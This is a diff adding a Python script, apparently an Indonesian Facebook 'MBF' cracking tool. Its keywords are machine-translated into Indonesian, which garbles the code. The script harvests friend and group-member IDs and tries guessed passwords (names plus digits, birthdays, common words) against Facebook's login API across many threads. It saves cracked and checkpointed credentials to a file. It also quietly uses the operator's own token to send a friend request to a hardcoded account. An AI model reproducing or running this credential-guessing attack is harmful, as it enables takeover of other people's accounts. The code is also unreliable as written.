@@ -1,0 +1,873 @@
+#! / usr / bin / python2
+# coding = utf-8
+
+
+impor  os , sys , waktu , datetime , acak , hashlib , re , threading , json , urllib , cookielib , permintaan , mekanisasi
+dari  multiprocessing . pool  import  ThreadPool
+dari  permintaan . pengecualian  mengimpor  ConnectionError
+dari  mekanis  impor  Browser
+
+
+memuat ulang ( sys )
+sys . setdefaultencoding ( 'utf8' )
+br  =  mekanisasi . Browser ()
+br . set_handle_robots ( False )
+br . set_handle_refresh ( mekanisasi . _http . HTTPRefreshProcessor (), max_time = 1 )
+br . addheaders  = [( 'User-Agent' , 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Versi / 12.16' )]
+
+
+def  Keluar ():
+	cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mKeluar"
+	os . sys . keluar ()
+	
+	
+def  acak ( x ):
+    w  =  'mhkbpcP'
+    d  =  ''
+    untuk  saya  dalam  x :
+        d  + =  '!' + w [ acak . Randand ( 0 , len ( w ) - 1 )] + i
+    return  cetak ( d )
+    
+    
+def  cetak ( x ):
+    w  =  'mhkbpcP'
+    untuk  saya  dalam  w :
+        j  =  w . indeks ( i )
+        x =  x . ganti ( '!% s' % i , ' \ 033 [% s; 1m' % str ( 31 + j ))
+    x  + =  ' \ 033 [0m'
+    x  =  x . ganti ( '! 0' , ' \ 033 [0m' )
+    sys . stdout . tulis ( x + ' \ n ' )
+	
+
+def  jalan ( z ):
+	untuk  e  in  z  +  ' \ n ' :
+		sys . stdout . tulis ( e )
+		sys . stdout . flush ()
+		waktu . tidur ( 0,05 )
+		
+		
+logo  =  "" "   \ x1b [1; 93m  ++++++++   \ x1b [1; 92m RAFLY  \ x1b [1; 94m PAKE   \ x1b [1; 91m I \ n  \ x1b [1; 93m APA \ x1b [1; 92m | LIAT | \ x1b [1; 94m | LIAT |   \ x1b [1; 91m | BAKU | \ n  \ x1b [1; 93m | HANTAM | \ x1b [1; 92m | | YUK| | x1b [1; 94m | | AYO |   \ x1b [1; 91m | | SINI | | \ n  \ x1b [1; 93m | | KLO | x1b [1; 92m | BERANI \ x1b [1; 94m | | _ || _ \ x1b [1; 91m | _ | \ n  \ x1b[1; 93 m | | _ | | \ x1b [1; 92m | | \ x1b [1; 94m | __ | \ x1b [1; 91m | | _ \ n  \ x1b [1; 93m | | \ x1b [1; 92m | _ | \ x1b [1; 94m | | | | \ x1b [1; 91m | _ | \ n  \ x1b [1; 93m | ______ | \ x1b [1; 92m | __ | | __ | \ x1b [1; 94m | ___ | | _ | \ x1b [1; 91m | ___ | | _ | \ x1b [1; 96mRaflypakei \ n \ n  \ x1b [1; 95m ASSALAMUALAIKUM WARAHMATULLAHI WABARAKATU\ n ✫╬─ \ x1b [1; 92mReCode \ x1b [1; 91m: \ x1b[1; 93mRaflyPakei                    \ x1b [1; 95m─╬✫ \ n ✫╬─ \ x1b [1; 92mYt     \ x1b [1; 92m \ x1b [1; 91m: \ x1b [1; 96mRafly pake i      \ x1b [1; 95m─╬✫ \ n ✫╬─ \ x1b [1; 92mWa \ x1b [1; 91m: \ x1b [1; 94m082290232340      \ x1b [1; 95m─╬✫ \ n ●HACKER SULAWESI SELATAN-PALOPO-IRI BILANG BOS TAK PERLU BACOT ANDA SOPAN KAMI BAIK
+"" "
+
+def  tik ():
+	titik  = [ '. ' , ' .. ' , ' ... ' ]
+	untuk  o  di  titik :
+		print ( " \ r \ 033 [1; 96m [●] \ x1b [1; 93mSedang masuk harap sabar, tapi boong \ x1b [1; 97m" + o ),; sys . stdout . flush (); waktu . tidur ( 1 )
+
+
+kembali  =  0
+utas  = []
+berhasil  = []
+cekpoint  = []
+oks  = []
+id  = []
+listgrup  = []
+vulnot  =  " \ 033 [31mNidak Vuln"
+vuln  =  " \ 033 [32mVuln"
+
+def  siapa ():
+	os . sistem ( 'jelas' )
+	nama  =  raw_input ( " \ 033 [1; 97mLangganan chanel Rafly pake aku duluya? \ 033 [1; 91m: \ 033 [1; 92m" )
+	jika  nama  == "" :
+		cetak " \ 033 [1; 96m [!] \ 033 [1; 91mIsi yang benar"
+		waktu . tidur ( 1 )
+		siapa ()
+	lain :
+		os . sistem ( 'jelas' )
+		jalan ( " \ 033 [1; 97mSelamat datang \ 033 [1; 92m"  + nama +  " \ n \ 033 [1; 97mJangan lupa berlangganan saluran pembuat ya Rafly pake i !!" )
+		waktu . tidur ( 1 )
+		loginSC ()
+		
+		
+def  loginSC ():
+	os . sistem ( 'jelas' )
+	print " \ 033 [1; 97mSilahkan login SC ketik pengguna: Rafly pw: Pakei \ n "
+	username  =  raw_input ( " \ 033 [1; 96m [*] \ 033 [1; 97mUsername \ 033 [1; 91m: \ 033 [1; 92m" )
+	kata sandi  =  raw_input ( " \ 033 [1; 96m [*] \ 033 [1; 97mPassword \ 033 [1; 91m: \ 033 [1; 92m" )
+	jika  nama pengguna  == "Rafly"  dan  kata sandi  == "Pakei" :
+		print " \ 033 [1; 96m [✓] \ 033 [1; 92mLogin berhasil jangan lupa coli"
+		waktu . tidur ( 1 )
+		login ()
+	lain :
+		cetak " \ 033 [1; 96m [!] \ 033 [1; 91mSalah !!"
+		waktu . tidur ( 1 )
+                LoginSC ()
+
+def  login ():
+	os . sistem ( 'jelas' )
+	coba :
+		toket  =  buka ( 'login.txt' , 'r' )
+		menu ()
+	kecuali ( KeyError , IOError ):
+		os . sistem ( 'jelas' )
+		cetak  logo
+		cetak  42 * " \ 033 [1; 96m ="
+		cetak ( ' \ 033 [1; 96m [☆] \ x1b [1; 93mLOGIN PAKE RAFLY I \ x1b [1; 96m [☆]' ))
+		id  =  raw_input ( ' \ 033 [1; 96m [+] \ x1b [1; 93mID / Email \ x1b [1; 91m: \ x1b [1; 92m' )
+		pwd  =  raw_input ( ' \ 033 [1; 96m [+] \ x1b [1; 93mPassword \ x1b [1; 91m: \ x1b [1; 92m' )
+		tik ()
+		coba :
+		br . buka ( 'https://m.facebook.com' )
+		kecuali  mekanisasi . URLError :
+			cetak " \ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
+			keluar ()
+		br . _factory . is_html  =  Benar
+		br . select_form ( nr = 0 )
+		br . form [ 'email' ] =  id
+		br . form [ 'pass' ] =  pwd
+		br . kirim ()
+		url  =  br . geturl ()
+		jika  'save-device'  di  url :
+			coba :
+				sig =  'api_key = 882a8490361da98702bf97a021ddc14dcredentials_type = passwordemail =' + id + 'format = JSONgenerate_machine_id = 1generate_session_cookies = 1locale = en_USmethod = auth.loginpassword =' + pwd + 'return_ssl_resources = 0V = 1.062f8ce9f74b12f84c123cc23437a4a32'
+				data  = { "api_key" : "882a8490361da98702bf97a021ddc14d" , "credentials_type" : "kata sandi" , "email" : id , "format" : "JSON" , "menghasilkan_machine_id" : "1" , "menghasilkan_session_cookies" : "1" , " lokal " : " en_US " , " metode " : " auth.login " , " kata sandi " : pwd , "return_ssl_resources " : " 0 " , " v " : " 1.0 "}
+				x = hashlib . baru ( "md5" )
+				x . perbarui ( sig )
+				a = x . hexdigest ()
+				data . perbarui ({ 'sig' : a })
+				url  =  "https://api.facebook.com/restserver.php"
+				r = permintaan . dapatkan ( url , params = data )
+				z = json . memuat ( r . teks )
+				unikers  =  open ( "login.txt" , 'w' )
+				unikers . tulis ( z [ 'access_token' ])
+				unikers . tutup ()
+				cetak  ' \ n \ 033 [1; 96m [✓] \ x1b [1; 92mLogin Berhasil'
+				permintaan . pos ( 'https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z [ 'access_token' ])
+				os . sistem ( 'xdg-buka https://www.youtube.com/channel/UCJRsXsoiWHqBysdGXEjl8Hg' )
+				menu ()
+			kecuali  permintaan . pengecualian . ConnectionError :
+				cetak " \ n \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
+				keluar ()
+		jika  'pos pemeriksaan'  di  url :
+			print ( " \ n \ 033 [1; 96m [!] \ x1b [1; 91mungkin akun Anda dan pos pemeriksaan kena" )
+			os . sistem ( 'rm -rf login.txt' )
+			waktu . tidur ( 1 )
+			keluar ()
+		lain :
+			cetak ( " \ n \ 033 [1; 96m [!] \ x1b [1; 91mPassword / Email salah" )
+			os . sistem ( 'rm -rf login.txt' )
+			waktu . tidur ( 1 )
+			login ()
+			
+			
+ menu def ():
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		os . sistem ( 'jelas' )
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	coba :
+		otw  =  permintaan . dapatkan ( 'https://graph.facebook.com/me?access_token=' + toket )
+		a  =  json . memuat ( ot . teks )
+		nama  =  a [ 'name' ]
+		id  =  a [ 'id' ]
+	kecuali  KeyError :
+		os . sistem ( 'jelas' )
+		cetak " \ 033 [1; 96m [!] \ 033 [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		login ()
+	kecuali  permintaan . pengecualian . ConnectionError :
+		print " \ 033 [1; 96m [!] \ x1b [1; 91mTidak ada koneksi"
+		keluar ()
+	os . sistem ( "hapus" )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m Nama \ 033 [1; 91m: \ 033 [1; 92m" + nama + " \ 033 [1; 97 m "
+	cetak  " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m ID    \ 033 [1; 91m: \ 033 [1; 92m" + id + " \ x1b [1; 97 m "
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  " \ x1b [1; 97m1. \ x1b [1; 93m Hack facebook MBF"
+	cetak  " \ x1b [1; 97m2. \ x1b [1; 93m Lihat daftar grup"
+	cetak  " \ x1b [1; 97m3. \ x1b [1; 93m Informasi akun"
+	cetak  " \ x1b [1; 97m4. \ x1b [1; 93m Yahoo clone"
+	cetak  " \ n \ x1b [1; 91m0. \ x1b [1; 91m Keluar"
+	pilih ()
+
+
+def  pilih ():
+	unikers  =  raw_input ( " \ n \ 033 [1; 97m >>> \ 033 [1; 97m" )
+	jika  unikers  == "" :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+		pilih ()
+	elif  unikers  == "1" :
+		super ()
+	elif  unikers  == "2" :
+		grupsaya ()
+	elif  unikers  == "3" :
+		informasi ()
+	elif  unikers  == "4" :
+		yahoo ()
+			yahoo ()
+	elif  unikers  == "0" :
+		os . sistem ( 'jelas' )
+		jalan ( 'Menghapus token' )
+		os . sistem ( 'rm -rf login.txt' )
+		keluar ()
+	lain :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+		pilih ()
+		
+		
+def  super ():
+	 toket global
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	os . sistem ( 'jelas' )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	cetak  " \ x1b [1; 97m1. \ x1b [1; 93m Retak dari daftar teman"
+	cetak  " \ x1b [1; 97m2. \ x1b [1; 93m Retak dari teman"
+	cetak  " \ x1b [1; 97m3. \ x1b [1; 93m Retak dari anggota grup"
+	cetak  " \ x1b [1; 97m4. \ x1b [1; 93m Retak dari file"
+	cetak  " \ n \ x1b [1; 91m0. \ x1b [1; 91m Kembali"
+	pilih_super ()
+
+def  pilih_super ():
+	peak  =  raw_input ( " \ n \ 033 [1; 97m >>> \ 033 [1; 97m" )
+	jika  puncak  == "" :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+		pilih_super ()
+	elif  peak  == "1" :
+		os . sistem ( 'jelas' )
+		cetak  logo
+		cetak  42 * " \ 033 [1; 96m ="
+		jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...' )
+		r  =  permintaan . dapatkan ( "https://graph.facebook.com/me/friends?access_token=" + toket )
+		z  =  json . memuat ( r . teks )
+		untuk  s  di  z [ 'data' ]:
+			id . append ( s [ 'id' ])
+	elif  peak  == "2" :
+		os . sistem ( 'jelas' )
+		cetak  logo
+		cetak  42 * " \ 033 [1; 96m ="
+		idt  =  raw_input ( " \ 033 [1; 96m [+] \ 033 [1; 93mMasukan ID teman \ 033 [1; 91m: \ 033 [1; 97m" )
+		coba :
+			jok  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "? access_token =" + toket )
+			op  =  json . memuat ( jok . text )
+			cetak " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama teman \ 033 [1; 91m: \ 033 [1; 97m" + op [ "name" ]
+		kecuali  KeyError :
+			print " \ 033 [1; 96m [!] \ x1b [1; 91mTeman tidak ditemukan!"
+			raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+			super ()
+		jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...' )
+		r  =  permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/ friends? access_token =" + toket )
+		z  =  json . memuat ( r . teks )
+		untuk  saya  dalam  z [ 'data' ]:
+			id . tambahkan ( i [ 'id' ])
+	elif  peak  == "3" :
+		os . sistem ( 'jelas' )
+		cetak  logo
+		cetak  42 * " \ 033 [1; 96m ="
+		idg = raw_input ( ' \ 033 [1; 96m [+] \ 033 [1; 93mMasukan grup ID \ 033 [1; 91m: \ 033 [1; 97m' )
+		coba :
+			r = permintaan . dapatkan ( 'https://graph.facebook.com/group/?id=' + idg + '& access_token =' + toket )
+			asw = json . memuat ( r . teks )
+			cetak " \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mNama grup \ 033 [1; 91m: \ 033 [1; 97m" + asw [ 'name' ]
+		kecuali  KeyError :
+			print " \ 033 [1; 96m [!] \ x1b [1; 91mGroup tidak ditemukan"
+			raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+			super ()
+		jalan ( ' \ 033 [1; 96m [✺] \ 033 [1; 93mMengambil ID \ 033 [1; 97m ...' )
+		re = permintaan . dapatkan ( 'https://graph.facebook.com/' + idg + '/ members? bidang = nama, id & batas = 999999999 & access_token =' + toket )
+		s = json . memuat ( ulang . teks )
+		untuk  p  di  s [ 'data' ]:
+			id . tambahkan ( p [ 'id' ])
+	elif  peak  == "4" :
+		os . sistem ( 'jelas' )
+		cetak  logo
+		cetak  42 * " \ 033 [1; 96m ="
+		coba :
+			idlist  =  raw_input ( ' \ x1b [1; 96m [+] \ x1b [1; 93mMasukan file nama   \ x1b [1; 91m: \ x1b [1; 97m' )
+			untuk  baris  di  terbuka ( idlist , 'r' ). readlines ():
+				id . tambahkan ( baris . strip ())
+		kecuali  IOError :
+			cetak  ' \ x1b [1; 96m [!] \ x1b [1; 91mFile tidak ditemukan'
+			raw_input ( ' \ n \ x1b [1; 96m [ \ x1b [1; 97mKembali \ x1b [1; 96m]' )
+			super ()
+	elif  peak  == "0" :
+		menu ()
+	lain :
+		cetak  " \ 033 [1; 96m [!] \ x1b [1; 91mIsi yang benar"
+		pilih_super ()
+	
+	cetak  " \ 033 [1; 96m [+] \ 033 [1; 93mTotal ID \ 033 [1; 91m: \ 033 [1; 97m" + str ( len ( id ))
+	titik  = [ '. ' , ' .. ' , ' ... ' ]
+	untuk  o  di  titik :
+		cetak ( " \ r \ 033 [1; 96m [ \ 033 [1; 97m✸ \ 033 [1; 96m] \ 033 [1; 93mCrack \ 033 [1; 97m" + o ),; sys . stdout . flush (); waktu . tidur ( 1 )
+	mencetak
+	cetak ( ' \ x1b [1; 96m [!] \ x1b [1; 93mHentikan CTRL + z' )
+	cetak  42 * " \ 033 [1; 96m ="
+	
+			
+	def  main ( arg ):
+		 cekpoint global , oks
+		pengguna  =  arg
+		coba :
+			os . mkdir ( 'keluar' )
+		kecuali  OSError :
+			lulus
+			coba :
+			a  =  permintaan . dapatkan ( 'https://graph.facebook.com/' + user + '/? access_token =' + toket )
+			b  =  json . beban ( a . teks )
+			pass1  =  b [ 'first_name' ] + '123'
+			data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass1 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+			q  =  json . memuat ( data )
+			jika  'access_token'  di  q :
+				cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+				cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+				cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+				cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass1  +  ' \ n '
+				oks . tambahkan ( pengguna + pass1 )
+			lain :
+				jika  'www.facebook.com'  di  q [ "error_msg" ]:
+					cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+					cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+					cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+					cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass1  +  ' \ n '
+					cek  =  buka ( "out / super_cp.txt" , "a" )
+					cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass1 + " \ n " )
+					cek . tutup ()
+					cekpoint . tambahkan ( pengguna + pass1 )
+				lain :
+					pass2  =  b [ 'first_name' ] + '12345'
+					data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass2 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+					q  =  json . memuat ( data )
+					jika  'access_token'  di  q :
+						cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+						cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+						cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+						cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass2  +  ' \ n '
+						oks . tambahkan ( pengguna + pass2 )
+					lain :
+						jika  'www.facebook.com'  di  q [ "error_msg" ]:
+							cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+							cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+							cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+							cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass2  +  ' \ n '
+							cek  =  buka ( "out / super_cp.txt" , "a" )
+							cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass2 + " \ n " )
+							cek . tutup ()
+							cekpoint . tambahkan ( pengguna + pass2 )
+						lain :
+							pass3  =  b [ 'last_name' ] +  '123'
+							data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass3 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+							q  =  json . memuat ( data )
+							jika  'access_token'  di  q :
+								cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+								cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+								cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+								cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass3  +  ' \ n '
+								oks . tambahkan ( pengguna + pass3 )
+							lain :
+								jika  'www.facebook.com'  di  q [ "error_msg" ]:
+									cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+									cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+									cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+									cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass3  +  ' \ n '
+									cek  =  buka ( "out / super_cp.txt" , "a" )
+									cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass3 + " \ n " )
+									cek . tutup ()
+									cekpoint . tambahkan ( pengguna + pass3 )
+								lain :
+									pass4  =  'Bangsat'
+									data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass4 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+									q  =  json . memuat ( data )
+									jika  'access_token'  di  q :
+										cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+										cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+										cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+										cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass4  +  ' \ n '
+										oks . tambahkan ( pengguna + pass4 )
+									lain :
+										jika  'www.facebook.com'  di  q [ "error_msg" ]:
+											cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+											cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+											cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+											cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass4  +  ' \ n '
+											cek  =  buka ( "out / super_cp.txt" , "a" )
+											cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass4 + " \ n " )
+											cek . tutup ()
+											cekpoint . tambahkan ( pengguna + pass4 )
+										lain :
+											ulang tahun  =  b [ 'ulang tahun' ]
+											pass5  =  ulang tahun . ganti ( '/' , '' )
+											data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass5 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+											q  =  json . memuat ( data )
+											jika  'access_token'  di  q :
+												cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+												cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+												cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+												cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass5  +  ' \ n '
+												oks . tambahkan ( pengguna + pass5 )
+											lain :
+												jika  'www.facebook.com'  di  q [ "error_msg" ]:
+													cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+													cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+													cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+													cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass5  +  ' \ n '
+													cek  =  buka ( "out / super_cp.txt" , "a" )
+													cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass5 + " \ n " )
+													cek . tutup ()
+													cekpoint . tambahkan ( pengguna + pass5 )
+												lain :
+													pass6  =  'Sayang'
+													data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass6 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
+													q  =  json . memuat ( data )
+													jika  'access_token'  di  q :
+														cetak  ' \ x1b [1; 96m [✓] \ x1b [1; 92mBERHASIL'
+														cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 92m'  +  b [ 'name' ]
+														cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 92m'  +  pengguna
+														cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 92m'  +  pass6  +  ' \ n '
+														oks . tambahkan ( pengguna + pass6 )
+													lain :
+														jika  'www.facebook.com'  di  q [ "error_msg" ]:
+															cetak  ' \ x1b [1; 96m [✖] \ x1b [1; 93mCEKPOINT'
+															cetak  ' \ x1b [1; 96m [✺] \ x1b [1; 97mNama \ x1b [1; 91m: \ x1b [1; 93m'  +  b [ 'name' ]
+															cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mID \ x1b [1; 91m: \ x1b [1; 93m'  +  pengguna
+															cetak  ' \ x1b [1; 96m [➹] \ x1b [1; 97mPassword \ x1b [1; 91m: \ x1b [1; 93m'  +  pass6  +  ' \ n '
+															cek  =  buka ( "out / super_cp.txt" , "a" )
+															cek . tulis ( "ID:"  + pengguna +  "Pw:"  + pass6 + " \ n " )
+															cek . tutup ()
+															cekpoint . tambahkan ( pengguna + pass6 )
+		kecuali :
+			lulus
+			p  =  ThreadPool ( 30 )
+	hal . peta ( utama , id )
+	cetak  ' \ 033 [1; 96m [ \ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mSelesai \ 033 [1; 97m ....'
+	cetak " \ 033 [1; 96m [+] \ 033 [1; 92mTotal OK / \ x1b [1; 93mCP \ 033 [1; 91m: \ 033 [1; 92m" + str ( len ( oks )) + " \ 033 [1; 97m / \ 033 [1; 93m " + str ( len ( cekpoint ))
+	print ( " \ 033 [1; 96m [+] \ 033 [1; 92mCP File disimpan \ 033 [1; 91m: \ 033 [1; 97mout / super_cp.txt" )
+	raw_input ( " \ n \ 033 [1; 96m [ \ 033 [1; 97mKembali \ 033 [1; 96m]" )
+	super ()
+
+
+def  grupsaya ():
+	os . sistem ( 'jelas' )
+	coba :
+		toket = buka ( 'login.txt' , 'r' ). baca ()
+	kecuali  IOError :
+		cetak " \ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os . sistem ( 'rm -rf login.txt' )
+		waktu . tidur ( 1 )
+		keluar ()
+	coba :
+		os . mkdir ( 'keluar' )
+	kecuali  OSError :
+		lulus
+	os . sistem ( 'jelas' )
+	cetak  logo
+	cetak  42 * " \ 033 [1; 96m ="
+	coba :
+		uh  =  permintaan . dapatkan ( 'https://graph.facebook.com/me/groups?access_token=' + toket )
+		gud  =  json . memuat ( eh . teks )
+		untuk  p  in  gud [ 'data' ]:
+			nama  =  p [ "name" ]
+			id  =  p [ "id" ]
+			f = terbuka ( 'out / Grupid.txt' , 'w' )
+			listgrup . tambahkan ( id )
+			f . tulis ( id  +  ' \ n ' )
+			cetak ( " \ 033 [1; 96m [✓] \ 033 [1; 92mGROUP SAYA" )
+			cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mID   \ 033 [1; 91m: \ 033 [1; 92m" + str ( id ))
+			cetak ( " \ 033 [1; 96m [➹] \ 033 [1; 97mNama \ 033 [1; 91m: \ 033 [1; 92m" + str ( nama ) +  ' \ n ' )
+		cetak  42 * " \ 033 [1; 96m ="
